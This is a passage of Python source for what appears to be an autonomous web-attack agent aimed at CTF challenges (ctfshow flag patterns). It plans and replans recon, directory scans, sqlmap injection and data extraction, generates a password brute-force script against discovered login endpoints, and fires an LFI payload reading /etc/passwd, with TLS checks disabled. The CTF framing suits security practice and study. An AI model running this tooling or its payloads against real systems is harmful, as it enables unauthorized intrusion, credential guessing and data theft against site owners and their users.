        auth_structured_signal_ready = bool(auth_state.get("structured_auth_signal", False))

        active_replan = dict(replan or {})
        blocked_action_ids = set(active_replan.get("blocked_action_ids") or [])
        blocked_tools = set(active_replan.get("blocked_tools") or [])
        blocked_findings = list(active_replan.get("blocked_findings") or [])
        avoid_action_ids = set(signals.get("avoid_action_ids") or [])
        avoid_action_ids.update(active_replan.get("avoid_action_ids") or [])
        avoid_action_ids.update(blocked_action_ids)
        avoid_tools = set(signals.get("avoid_tools") or [])
        avoid_tools.update(active_replan.get("avoid_tools") or [])
        avoid_tools.update(blocked_tools)
        avoid_lineages = {
            str(value or "").strip()
            for value in [*(signals.get("blocked_findings") or []), *(active_replan.get("avoid_lineages") or [])]
            if isinstance(value, str) and str(value or "").strip()
        }
        for finding in blocked_findings:
            if not isinstance(finding, dict):
                continue
            lineage_key = "::".join(
                [
                    part
                    for part in [
                        str(finding.get("kind") or "").strip(),
                        str(finding.get("value") or "").strip(),
                        str(finding.get("verification_family") or finding.get("kind") or "").strip(),
                    ]
                    if part
                ]
            )
            if lineage_key:
                avoid_lineages.add(lineage_key)
        source_action_id = str(active_replan.get("source_action_id") or "").strip()
        source_action_type = str(active_replan.get("source_action_type") or "").strip()
        reason_code = str(active_replan.get("reason_code") or active_replan.get("reason") or "").strip()

        candidates: List[Dict[str, Any]] = []
        seen_action_ids = set()

        def add_candidate(action: Optional[Dict[str, Any]]) -> None:
            if not action:
                return
            candidate = dict(action)
            candidate["expected_tool"] = self._canonical_tool_name(candidate)
            action_id = str(candidate.get("id") or "").strip()
            tool_name = str(candidate.get("expected_tool") or "").strip()
            if not action_id or action_id in seen_action_ids:
                return
            if action_id in avoid_action_ids:
                return
            if tool_name and tool_name in avoid_tools:
                return
            lineage_key = "::".join(
                [
                    part
                    for part in [
                        str(candidate.get("source_finding_kind") or "").strip(),
                        str(candidate.get("source_finding_value") or "").strip(),
                        str(candidate.get("verification_family") or candidate.get("source_finding_kind") or "").strip(),
                    ]
                    if part
                ]
            )
            if lineage_key and lineage_key in avoid_lineages:
                return
            if self.memory.should_skip_action(action_id, max_failures=self.max_failures):
                return
            seen_action_ids.add(action_id)
            candidates.append(candidate)

        for finding in verification_hints or priority_findings:
            add_action = self._build_verification_action_from_finding(finding, target)
            if add_action is not None:
                add_candidate(add_action)

        for action in self._build_guidance_actions(
            latest_guidance,
            target=target,
            source_action_id=source_action_id,
            source_action_type=source_action_type,
        ):
            add_candidate(action)

        for action in self._build_resource_backed_actions(
            target,
            signals,
            source_action_id=source_action_id,
            source_action_type=source_action_type,
            allow_auth_sqli=has_auth_endpoint_enum_success or auth_structured_signal_ready,
        ):
            add_candidate(action)

        if known_endpoints and "dirsearch" not in failed_tools and "python_poc" not in avoid_tools:
            latest_endpoint = str(signals.get("latest_endpoint") or known_endpoints[-1])
            endpoint_target = self._target_with_endpoint(latest_endpoint)
            current_target = self.target_url or getattr(self.agent_context, "url", "") or ""
            if endpoint_target and endpoint_target != current_target and not any(step.target == endpoint_target for step in steps):
                add_candidate(
                    self._build_action(
                        "recon",
                        target=endpoint_target,
                        description="基于已发现端点继续侦察",
                        intent="沿最新发现的端点继续收集可利用线索",
                        expected_tool="recon",
                        metadata={
                            "source_finding_kind": "endpoint",
                            "source_finding_value": latest_endpoint,
                            "source_action_id": source_action_id,
                            "source_action_type": source_action_type,
                            "verification_family": "endpoint",
                            "priority": "medium",
                        },
                    )
                )

                endpoint_lower = latest_endpoint.lower()
                if any(token in endpoint_lower for token in [".git/", ".svn/", ".env", ".zip", ".tar", "backup", "backdoor", "phpinfo"]):
                    add_candidate(self._build_verification_action_from_finding({
                        "kind": "repo_exposure" if any(token in endpoint_lower for token in [".git/", ".svn/"]) else "sensitive_file",
                        "value": latest_endpoint,
                        "source_action_id": source_action_id,
                    }, target))

        if known_parameters and self.target_type == "unknown" and "sqlmap" not in failed_tools and "sqlmap" not in avoid_tools:
            latest_parameter = str(signals.get("latest_parameter") or known_parameters[-1])
            param_target = target
            if latest_parameter and "=" not in param_target:
                separator = "&" if "?" in param_target else "?"
                param_target = f"{param_target}{separator}{latest_parameter}=1"
            add_candidate(
                self._build_verification_action_from_finding(
                    {
                        "kind": "parameter",
                        "value": latest_parameter,
                        "source_action_id": source_action_id,
                        "source_node_id": active_replan.get("source_node_id") or "",
                    },
                    target,
                )
            )

        known_vulnerabilities = list(signals.get("known_vulnerabilities") or [])
        if known_vulnerabilities and "python_poc" not in avoid_tools:
            latest_vuln = known_vulnerabilities[-1]
            add_candidate(
                self._build_verification_action_from_finding(
                    {
                        "kind": "vulnerability",
                        "value": latest_vuln,
                        "source_action_id": source_action_id,
                        "source_node_id": active_replan.get("source_node_id") or "",
                    },
                    target,
                )
            )

        # 检测登录端点，生成攻击候选动作
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])
        known_auth_hints = [item for item in (known_parameters + known_endpoints + known_vulnerabilities) if isinstance(item, str)]
        login_endpoints = [ep for ep in known_endpoints if 'check' in ep.lower() or 'login' in ep.lower() or 'signin' in ep.lower() or 'auth' in ep.lower()]
        login_params = [p for p in known_parameters if p.lower() in ['u', 'p', 'username', 'password', 'user', 'pass', 'email', 'token', 'csrf']]
        has_auth_signal = (
            self.target_type == "auth"
            and (
                bool(login_endpoints)
                or len(login_params) >= 2
                or any('password' in item.lower() or 'username' in item.lower() or 'login' in item.lower() for item in known_auth_hints)
            )
        )

        if has_auth_signal and "poc" not in avoid_tools and "python_poc" not in avoid_tools:
            # 生成暴力破解代码
            endpoint = login_endpoints[0] if login_endpoints else "check.php"
            param_u = login_params[0] if login_params else "u"
            param_p = login_params[1] if len(login_params) > 1 else "p"

            brute_code = f'''
import requests
import sys

target = "{target.rstrip('/')}/{endpoint}"
passwords = ["admin888", "admin", "password", "123456", "12345678", "1234", "admin123", "root", "toor", "ctfshow", "flag"]

for pwd in passwords:
    try:
        resp = requests.post(target, data={{"{param_u}": "admin", "{param_p}": pwd}}, verify=False, timeout=10)
        if "error" not in resp.text.lower() and resp.text.strip():
            print(f"[SUCCESS] Found password: {{pwd}}")
            print(f"Response: {{resp.text[:500]}}")
            sys.exit(0)
        else:
            print(f"[FAIL] {{pwd}}")
    except Exception as e:
        print(f"[ERROR] {{pwd}}: {{e}}")

print("No valid password found")
'''

            add_candidate(
                self._build_action(
                    "poc",
                    target=target,
                    description="针对登录端点尝试暴力破解",
                    intent="基于已发现的登录端点/参数构造攻击",
                    expected_tool="python_poc",
                    params={"code": brute_code},
                    metadata={
                        "source_finding_kind": "login_endpoint",
                        "source_finding_value": f"endpoints: {login_endpoints}, params: {login_params}",
                        "source_action_id": source_action_id,
                        "source_action_type": source_action_type,
                    },
                )
            )

        has_auth_weak_creds_attempt = any(
            (step.action_type == "poc" and (step.canonical_tool or step.tool) == "python_poc")
            or (step.action_type == "poc" and step.expected_tool == "python_poc")
            for step in steps
        )

        failed_action_counts = dict(signals.get("failed_action_counts") or {})
        for action_id, count in recent_failure_stats.get("action_id_counts", {}).items():
            failed_action_counts[action_id] = max(failed_action_counts.get(action_id, 0), count)
        for action_id, count in failed_action_counts.items():
            if count < self.max_failures:
                continue
            latest_step = self.memory.latest_step_for_action(action_id)
            if latest_step and latest_step.target == target and latest_step.action_type in {"recon", "sqlmap_scan"}:
                if self.target_type == "auth":
                    add_candidate(
                        self._build_action(
                            "recon",
                            target=target,
                            description="认证入口已多次失败，继续枚举认证分支",
                            intent="auth 场景优先继续 endpoint-enum，而不是退化到目录扫描",
                            expected_tool="recon",
                            params={"focus": "auth-endpoints"},
                            metadata={
                                "tactic_family": "endpoint-enum",
                                "source_action_id": action_id,
                                "source_action_type": latest_step.action_type,
                                "alternative_to": action_id,
                                "derived_from": action_id,
                            },
                        )
                    )
                    continue
                add_candidate(
                    self._build_action(
                        "dir_scan",
                        target=target,
                        description="图中动作已多次失败，切换目录探索",
                        intent="避免重复失败动作，改用目录扫描寻找新入口",
                        expected_tool="dirsearch",
                        params={"extensions": ["php", "html", "txt"]},
                        metadata={
                            "source_action_id": action_id,
                            "source_action_type": latest_step.action_type,
                            "alternative_to": action_id,
                            "derived_from": action_id,
                        },
                    )
                )

        if (
            self.target_type != "auth"
            and (
                source_action_type in {"recon", "sqlmap_scan", "source_analysis"}
                or blocked_tools.intersection({"python_poc", "sqlmap", "source_analysis"})
                or reason_code in {"limited_diversity", "consecutive_failures"}
            )
            and "dirsearch" not in avoid_tools
        ):
            add_candidate(
                self._build_action(
                    "dir_scan",
                    target=target,
                    description="当前路径受阻，切换目录探索",
                    intent="从不同工具视角寻找新入口",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "html", "txt"]},
                    metadata={
                        "source_action_id": source_action_id,
                        "source_action_type": source_action_type,
                        "alternative_to": source_action_id,
                        "derived_from": source_action_id,
                    },
                )
            )

        if (source_action_type == "dir_scan" or "dirsearch" in blocked_tools) and "python_poc" not in avoid_tools:
            add_candidate(
                self._build_action(
                    "recon",
                    target=target,
                    description="目录扫描受阻后回退侦察",
                    intent="回到轻量侦察确认可见入口与响应差异",
                    expected_tool="recon",
                    params={"focus": "headers"},
                    metadata={
                        "source_action_id": source_action_id,
                        "source_action_type": source_action_type,
                        "alternative_to": source_action_id,
                        "derived_from": source_action_id,
                    },
                )
            )

        candidates = self._rank_graph_informed_candidates(
            candidates,
            signals=signals,
            recent_failure_stats=recent_failure_stats,
            replan=active_replan,
        )

        if self.target_type == "auth":
            auth_stage = auth_state.get("stage") or "weak-creds"
            priority_order = {
                "weak-creds": 0 if auth_stage == "weak-creds" else 2,
                "endpoint-enum": 0 if auth_stage == "endpoint-enum" else 1,
                "auth-sqli": 0 if auth_stage == "auth-sqli" else 3,
            }
            filtered_candidates = []
            for item in candidates:
                family = self._candidate_tactic_family(item)
                if auth_stage == "endpoint-enum" and family == "auth-sqli":
                    continue
                filtered_candidates.append(item)
            candidates = filtered_candidates
            candidates = sorted(
                candidates,
                key=lambda item: (priority_order.get(self._candidate_tactic_family(item), 99), candidates.index(item)),
            )
        return candidates

    def _candidate_tactic_family(self, candidate: Dict[str, Any]) -> str:
        candidate = dict(candidate or {})
        for key in ("tactic_family", "verification_family", "source_finding_kind", "action_type", "type"):
            value = str(candidate.get(key) or "").strip()
            if value:
                return value
        return "generic"

    def _action_tactic_family(self, action: Dict[str, Any]) -> str:
        action = dict(action or {})
        for key in ("tactic_family", "verification_family", "source_finding_kind"):
            value = str(action.get(key) or "").strip()
            if value:
                return value

        action_type = str(action.get("type") or "").strip()
        if action_type == "poc":
            params = dict(action.get("params") or {})
            login_params = list(params.get("login_params") or [])
            endpoint = str(params.get("endpoint") or "").strip().lower()
            if login_params or any(token in endpoint for token in ["login", "check", "signin", "auth"]):
                return "weak-creds"
        if action_type == "recon" and self.target_type == "auth":
            return "endpoint-enum"
        if action_type == "sqlmap_scan" and self.target_type == "auth":
            return "auth-sqli"
        if action_type:
            return action_type
        return "generic"

    def _resource_operationalization_status(self) -> Dict[str, Any]:
        self._sync_agent_context()
        skill_loaded = bool(getattr(self.agent_context, "skill_content", "") or self.init_result.get("skill_content"))
        loaded_resources = dict(getattr(self.agent_context, "loaded_resources", {}) or self.init_result.get("loaded_resources") or {})
        has_resource_bundle = bool(loaded_resources)
        has_rag = bool(getattr(self.agent_context, "rag_summary", "") or getattr(self.agent_context, "rag_suggested_approach", ""))
        used_sources = set(getattr(self.agent_context, "round_resource_sources_used", []) or [])
        return {
            "skill_loaded": skill_loaded,
            "has_resource_bundle": has_resource_bundle,
            "has_rag": has_rag,
            "resource_candidates_generated": bool(used_sources),
            "used_sources": sorted(used_sources),
        }

    def _required_tactic_families(self) -> List[str]:
        signals = self.graph_manager.planner_signals()
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])
        priority_findings = list(signals.get("priority_findings") or [])
        families: List[str] = []

        def add(name: str) -> None:
            if name and name not in families:
                families.append(name)

        if self.target_type == "auth":
            add("endpoint-enum")
            add("weak-creds")
            # Only add auth-sqli if we've actually confirmed endpoint-enum success
            auth_state = self._auth_progress_state() if self.target_type == "auth" else {}
            has_endpoint_confirmed = bool(auth_state.get("endpoint_enum_confirmed", False))
            if has_endpoint_confirmed:
                add("auth-sqli")
        for finding in priority_findings:
            kind = str(finding.get("kind") or "").strip()
            if kind == "repo_exposure":
                add("repo_exposure")
            elif kind == "source_leak":
                add("source_leak")
            elif kind == "parameter":
                add("parameter")
        if getattr(self.agent_context, "rag_summary", "") or getattr(self.agent_context, "rag_suggested_approach", ""):
            add("rag-parameter-verify")
        return families

    def _auth_stuck_with_all_families_attempted(self, attempted_families: Set[str]) -> bool:
        """Check if auth target is stuck despite attempting all currently required auth families."""
        if self.target_type != "auth":
            return False
        required = {family for family in self._required_tactic_families() if family in {"endpoint-enum", "weak-creds", "auth-sqli"}}
        if not required:
            return False
        return required.issubset(attempted_families)

    def _help_readiness(self) -> Dict[str, Any]:
        self._sync_agent_context()
        steps = self.memory.steps
        attempted_families = set(getattr(self.agent_context, "round_attempted_families", []) or [])
        required_families = self._required_tactic_families()
        legacy_help_mode = bool(getattr(self.agent_context, "legacy_help_mode", False))
        initial_required_families = list(getattr(self.agent_context, "initial_required_families", []) or [])
        if not initial_required_families and not required_families:
            self.memory.set_context(legacy_help_mode=True)
            self._sync_agent_context()
            legacy_help_mode = True
        if not legacy_help_mode and not initial_required_families and required_families:
            self.memory.set_context(initial_required_families=list(required_families))
            self._sync_agent_context()
            initial_required_families = list(getattr(self.agent_context, "initial_required_families", []) or [])
        baseline_required_families = [] if legacy_help_mode else (initial_required_families or required_families)
        missing_families = [family for family in baseline_required_families if family not in attempted_families]
        progress = self.memory.snapshot_progress()
        operationalization = self._resource_operationalization_status()
        round_num = int(progress.get("current_round") or 1)
        no_progress = int(progress.get("round_new_findings_count") or 0) <= 0
        recent_failures = self._get_consecutive_failures()
        rag_done = bool(getattr(self.agent_context, "rag_attempted_in_current_window", False))
        if not baseline_required_families:
            reason = "rag_not_attempted" if not rag_done else "ready_for_help"
            if not rag_done and recent_failures < max(1, self.max_failures - 1):
                reason = "not_enough_failures_after_coverage"
            return {
                "ready": bool(rag_done),
                "reason": reason,
                "required_families": baseline_required_families,
                "missing_families": [],
                "attempted_families": sorted(attempted_families),
                "progress": progress,
                "operationalization": operationalization,
            }
        ready = (
            bool(steps)
            and not missing_families
            and (no_progress or self._auth_stuck_with_all_families_attempted(attempted_families))
            and rag_done
            and (
                operationalization["resource_candidates_generated"]
                or not (operationalization["skill_loaded"] or operationalization["has_resource_bundle"] or operationalization["has_rag"])
            )
            and round_num >= 2
            and recent_failures >= self.max_failures
        )
        reason = ""
        if missing_families:
            reason = f"missing_families:{','.join(missing_families)}"
        elif not operationalization["resource_candidates_generated"] and (operationalization["skill_loaded"] or operationalization["has_resource_bundle"] or operationalization["has_rag"]):
            reason = "resources_not_operationalized"
        elif not no_progress and not self._auth_stuck_with_all_families_attempted(attempted_families):
            reason = "round_still_progressing"
        elif round_num < 2:
            reason = "need_more_rounds"
        elif not rag_done:
            reason = "rag_not_attempted"
        elif recent_failures < self.max_failures:
            reason = "not_enough_failures_after_coverage"
        else:
            reason = "ready_for_help"
        return {
            "ready": ready,
            "reason": reason,
            "required_families": baseline_required_families,
            "missing_families": missing_families,
            "attempted_families": sorted(attempted_families),
            "progress": progress,
            "operationalization": operationalization,
        }

    def _build_replan_payload(self) -> Dict[str, Any]:
        steps = self.memory.steps
        if not steps:
            return {}

        total_steps = len(steps)
        consecutive_failures = 0
        for step in reversed(steps):
            if step.success:
                break
            consecutive_failures += 1

        recent_failure_stats = self._recent_action_failure_counts(window=5)
        low_yield_stats = self._recent_low_yield_probe_stats(window=5)
        current_action = dict(self.last_action or {})
        latest_step = steps[-1]
        default_source_action_id = str(
            current_action.get("id")
            or getattr(latest_step, "action_id", "")
            or ""
        ).strip()
        default_source_action_type = str(
            current_action.get("type")
            or getattr(latest_step, "action_type", "")
            or ""
        ).strip()
        default_source_tool = str(
            self._canonical_tool_name(current_action)
            if current_action
            else getattr(latest_step, "canonical_tool", "") or getattr(latest_step, "tool", "")
        ).strip()

        def build_payload(
            reason_code: str,
            reason_detail: str,
            *,
            blocked_action_ids: Optional[List[str]] = None,
            blocked_tools: Optional[List[str]] = None,
            source_action_id: str = "",
            source_action_type: str = "",
            source_finding_kind: str = "",
            source_finding_value: str = "",
        ) -> Dict[str, Any]:
            payload: Dict[str, Any] = {
                "reason": reason_code,
                "reason_code": reason_code,
                "reason_detail": reason_detail,
                "source_action_id": source_action_id or default_source_action_id,
                "source_action_type": source_action_type or default_source_action_type,
                "blocked_action_ids": list(blocked_action_ids or ([default_source_action_id] if default_source_action_id else [])),
                "blocked_tools": list(blocked_tools or ([default_source_tool] if default_source_tool else [])),
            }
            verification_family = source_finding_kind or ""
            if source_finding_kind and source_finding_value:
                payload["source_finding_kind"] = source_finding_kind
                payload["source_finding_value"] = source_finding_value
                payload["verification_family"] = verification_family
                payload["blocked_findings"] = [
                    {
                        "kind": source_finding_kind,
                        "value": source_finding_value,
                        "verification_family": verification_family,
                    }
                ]
                payload["avoid_lineages"] = [
                    "::".join([part for part in [source_finding_kind, source_finding_value, verification_family] if part])
                ]
            payload["avoid_action_ids"] = list(payload.get("blocked_action_ids") or [])
            payload["avoid_tools"] = list(payload.get("blocked_tools") or [])
            candidates = [
                self._action_candidate_summary(action)
                for action in self._collect_graph_informed_actions(replan=payload)
            ]
            if candidates:
                payload["alternative_candidates"] = candidates
                payload["selected_alternative"] = dict(candidates[0])
            return payload

        if total_steps >= 5 and recent_failure_stats["distinct_actions"] <= 2 and recent_failure_stats["distinct_action_types"] <= 2:
            if self.target_type == "auth":
                auth_progress_markers = 0
                for step in steps:
                    text = str(getattr(step, "result", "") or "").lower()
                    findings = list(getattr(step, "key_findings", []) or [])
                    if any(marker in text for marker in ["found login form endpoint", "form method:", "form field:"]):
                        auth_progress_markers += 1
                    elif any("login form endpoint" in str(item).lower() or "form method" in str(item).lower() for item in findings):
                        auth_progress_markers += 1
                if auth_progress_markers <= 0:
                    return build_payload(
                        "limited_diversity",
                        "最近多步动作多样性不足，主链在少数路径间反复试错",
                    )
            else:
                return build_payload(
                    "limited_diversity",
                    "最近多步动作多样性不足，主链在少数路径间反复试错",
                )

        if low_yield_stats["low_yield_count"] >= 3 and low_yield_stats["repeated_current_target_count"] >= 2:
            return build_payload(
                "low_yield_probe_loop",
                "最近多次围绕同一目标做轻量探测且没有新增 finding，需要切换 lineage 或 family",
            )

        for action_id, count in recent_failure_stats["action_id_counts"].items():
            if count >= self.max_failures:
                latest_failed_step = self.memory.latest_step_for_action(action_id)
                return build_payload(
                    f"action_failures:{action_id}",
                    f"动作 {action_id} 已失败 {count} 次，需要避开该动作并切换分支",
                    blocked_action_ids=[action_id],
                    blocked_tools=[
                        str(
                            getattr(latest_failed_step, "canonical_tool", "")
                            or getattr(latest_failed_step, "tool", "")
                            or default_source_tool
                        )
                    ] if latest_failed_step or default_source_tool else [],
                    source_action_id=action_id,
                    source_action_type=str(getattr(latest_failed_step, "action_type", "") or default_source_action_type),
                )

        for action_type, count in recent_failure_stats["action_type_counts"].items():
            if count >= self.max_failures:
                return build_payload(
                    f"action_type_failures:{action_type}",
                    f"动作类型 {action_type} 已连续失败 {count} 次，需要改道",
                    source_action_type=action_type,
                )

        critical_tools = {"python_poc", "sqlmap", "dirsearch", "source_analysis"}
        for tool, count in recent_failure_stats["canonical_tool_counts"].items():
            if tool in critical_tools and count >= self.max_failures:
                return build_payload(
                    f"tool_failures:{tool}",
                    f"工具 {tool} 最近失败 {count} 次，需要暂时避开该工具",
                    blocked_tools=[tool],
                )

        if consecutive_failures >= self.max_failures:
            return build_payload(
                "consecutive_failures",
                f"已经连续失败 {consecutive_failures} 步，需要在 help 前先进行结构化改道",
            )

        return {}

    def plan_next_action(self) -> Dict[str, Any]:
        active_replan = dict(self.pending_replan or {})
        if active_replan:
            action = self._build_action_from_candidate(active_replan.get("selected_alternative") or {})
            if action is None:
                action = self._build_graph_informed_action(replan=active_replan)
            if action is None:
                self.replan_exhausted_reason = str(active_replan.get("reason_code") or active_replan.get("reason") or "")
                self.pending_replan = {}
                action = dict(self._decide_next_action())
            else:
                action = self._apply_replan_to_action(action, active_replan)
                self.last_replan = dict(action.get("replan") or active_replan)
                self.replan_exhausted_reason = None
                self.pending_replan = {}
        else:
            action = dict(self._decide_next_action())
            self.last_replan = {}

        action["expected_tool"] = self._canonical_tool_name(action)
        action["graph_op"] = self.graph_manager.build_action_graph_op(action)
        self.last_action = dict(action)
        return action

    def _execute_recon_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        code = f'''
import requests
import urllib3
import re
import json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
resp = requests.get(url, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
if 'Location' in resp.headers:
    print(f"Redirect: {{resp.headers['Location']}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print("BODY_START")
print(resp.text[:4000])
print("BODY_END")
'''
        result = execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

        body_match = re.search(r'BODY_START\n([\s\S]*?)\nBODY_END', result)
        body = body_match.group(1) if body_match else ""
        headers_match = re.search(r"Headers:\s*(\{.*\})", result)
        headers = {}
        if headers_match:
            try:
                headers = json.loads(headers_match.group(1).replace("'", '"'))
            except Exception:
                headers = {}
        status_match = re.search(r"Status:\s*(\d+)", result)
        status_code = int(status_match.group(1)) if status_match else 0

        recon_summary = summarize_auth_recon_response(target, status_code, headers, body)
        generic_summary = summarize_generic_recon_findings(target, status_code, headers, body)
        findings = list(recon_summary.get("findings") or []) + list(generic_summary.get("findings") or [])
        lower_body = body.lower()
        if "phpinfo()" in lower_body or ("php version" in lower_body and "php credits" in lower_body):
            findings.extend(["phpinfo_exposed", "info_leak"])
        for token in [".git/HEAD", ".git/config", "backdoor.php", ".env"]:
            if token.lower() in lower_body:
                findings.append(token)

        latest_step = self._latest_memory_step_for_action(action)
        if latest_step is not None:
            latest_step.key_findings = list(dict.fromkeys(list(latest_step.key_findings or []) + findings))
            latest_step.result = result[:500] if len(result) > 500 else result
        return result

    def _execute_ua_test_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        ua = action.get("params", {}).get("ua") or action.get("ua", "Mobile")
        code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
if 'Location' in resp.headers:
    print(f"Redirect to: {{resp.headers['Location']}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG: {{flags}}")
if resp.status_code == 200:
    print(f"Content: {{resp.text}}")
'''
        return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

    def _execute_follow_redirect_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        ua = action.get("params", {}).get("ua") or action.get("ua", "Mobile")
        code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Content-Length: {{len(resp.text)}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}|tfshow{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print(f"Content: {{resp.text}}")
'''
        return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

    def _execute_sqlmap_action(self, action: Dict[str, Any]) -> str:
        return sqlmap_scan_url(
            action.get("target", self.target_url),
            memory_meta=self._build_memory_action_meta(action),
            **action.get("params", {}),
        )

    def _execute_sqlmap_deep_action(self, action: Dict[str, Any]) -> str:
        return sqlmap_deep_scan_url(
            action.get("target", self.target_url),
            memory_meta=self._build_memory_action_meta(action),
            **action.get("params", {}),
        )

    def _execute_dir_scan_action(self, action: Dict[str, Any]) -> str:
        params = action.get("params", {})
        return quick_dir_scan(
            action.get("target", self.target_url),
            extensions=params.get("extensions"),
            memory_meta=self._build_memory_action_meta(action),
        )

    def _execute_source_analysis_action(self, action: Dict[str, Any]) -> str:
        code = action.get("code") or action.get("params", {}).get("code") or self.source_code
        if not code:
            return self._build_executor_error(action, "source code unavailable")
        result = self._analyze_source_code(code)
        self.memory.add_step(
            tool="source_analysis",
            target="PHP code",
            params={},
            result=result,
            success=True,
            action_meta=self._build_memory_action_meta(action),
        )
        return result

    def _execute_poc_action(self, action: Dict[str, Any]) -> str:
        steps = (
            action.get("steps")
            or action.get("params", {}).get("steps")
            or ([action.get("code")] if action.get("code") else [])
            or ([action.get("params", {}).get("code")] if action.get("params", {}).get("code") else [])
        )
        results = []
        memory_meta = self._build_memory_action_meta(action)
        for step_code in steps:
            if step_code:
                results.append(execute_python_poc(step_code, timeout=60, memory_meta=memory_meta))
        return "\n\n".join(results)

    def _execute_attack_step_action(self, action: Dict[str, Any]) -> str:
        step_name = action.get("step_name", "")
        code = action.get("code") or action.get("params", {}).get("code", "")

        if step_name == "recon":
            return self._execute_recon_action(
                self._build_action(
                    "recon",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "信息收集"),
                    intent="执行通用侦察以收集首页线索",
                    expected_tool="python_poc",
                    params={"from_attack_step": step_name},
                )
            )

        if step_name == "test_mobile_ua":
            ua_action = self._build_action(
                "ua_test",
                target=action.get("target", self.target_url),
                description=action.get("description", "测试Mobile UA"),
                intent="验证目标是否存在 UA 绕过",
                expected_tool="python_poc",
                params={"ua": "Mobile", "from_attack_step": step_name},
            )
            return self._execute_ua_test_action(ua_action)

        if step_name == "follow_redirect":
            redirect_target = action.get("target") or self.target_url
            if redirect_target == self.target_url and self.memory.steps:
                redirect_candidate = self._extract_redirect(self.memory.steps[-1].result)
                if redirect_candidate:
                    redirect_target = f"{self.target_url.rstrip('/')}/{redirect_candidate.lstrip('/')}"
            follow_action = self._build_action(
                "follow_redirect",
                target=redirect_target,
                description=action.get("description", "跟随重定向"),
                intent="访问重定向目标并继续提取线索",
                expected_tool="python_poc",
                params={"ua": "Mobile", "from_attack_step": step_name},
            )
            return self._execute_follow_redirect_action(follow_action)

        if step_name == "detect_sqli":
            return self._execute_sqlmap_action(
                self._build_action(
                    "sqlmap_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "检测SQL注入点"),
                    intent="用 sqlmap 验证注入点",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            )

        if step_name == "extract_data":
            return self._execute_sqlmap_deep_action(
                self._build_action(
                    "sqlmap_deep_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "提取数据"),
                    intent="提升扫描等级以提取数据",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            )

        if step_name == "test_lfi":
            payload_target = action.get("target", self.target_url)
            if "?" not in payload_target:
                payload_target = f"{payload_target}?file=../../../../etc/passwd"
            return self._execute_recon_action(
                self._build_action(
                    "recon",
                    target=payload_target,
                    description=action.get("description", "测试文件包含"),
                    intent="读取典型敏感文件验证 LFI",
                    expected_tool="python_poc",
                    params={"from_attack_step": step_name},
                )
            )

        if step_name == "exploit":
            return self._execute_dir_scan_action(
                self._build_action(
                    "dir_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "尝试利用前先补充目录扫描"),
                    intent="先扩展端点情报，再决定利用方式",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "bak", "txt"], "from_attack_step": step_name},
                )
            )

        if step_name == "extract_flag":
            recent_text = "\n\n".join(str(step.result) for step in self.memory.steps[-3:])
            flags = extract_flags(recent_text)
            if flags:
                return f"FLAG_FOUND: {flags[0]}"
            return self._build_executor_error(action, "flag not found in recent outputs")

        if code:
            return self._execute_poc_action(action)

        return self._build_executor_error(action, f"unsupported attack step: {step_name}")

    def _consume_replan_payload(self, step_num: int) -> Optional[Dict[str, Any]]:
        payload = dict(self._build_replan_payload() or {})
        if not payload:
            return None

        reason_code = str(payload.get("reason_code") or payload.get("reason") or "").strip()
        candidates = list(payload.get("alternative_candidates") or [])
        selected_alternative = dict(payload.get("selected_alternative") or {})
        if not candidates and selected_alternative:
            candidates = [dict(selected_alternative)]
            payload["alternative_candidates"] = list(candidates)
        if not candidates:
            self.replan_exhausted_reason = reason_code or None
            return None
        if not selected_alternative:
            selected_alternative = dict(candidates[0])
            payload["selected_alternative"] = dict(selected_alternative)

        self.pending_replan = dict(payload)
        self.last_replan = dict(payload)
        self.replan_exhausted_reason = None
        self.last_help_reason = None

        graph_op = self.graph_manager.build_checkpoint_graph_op(
            "replan",
            action=self.last_action,
            reason=reason_code,
            metadata=payload,
        )
        self.graph_manager.apply_graph_op(
            graph_op,
            action=self.last_action,
            step=step_num,
            reason=reason_code,
        )
        self._refresh_graph_state()
        return payload

    def maybe_request_help(self, step_num: int) -> Optional[str]:
        """根据当前状态判断是否需要求助。"""
        replan_payload = self._consume_replan_payload(step_num)
        if replan_payload:
            return None

        if not self._should_ask_for_help():
            readiness = self._help_readiness()
            reason = str(readiness.get("reason") or "")
            self.memory.set_help_readiness_reason(reason)
            if reason in {"need_more_rounds", "resources_not_operationalized"}:
                self.memory.start_new_round(step=step_num, reason=reason)
                self._sync_agent_context()
            return None

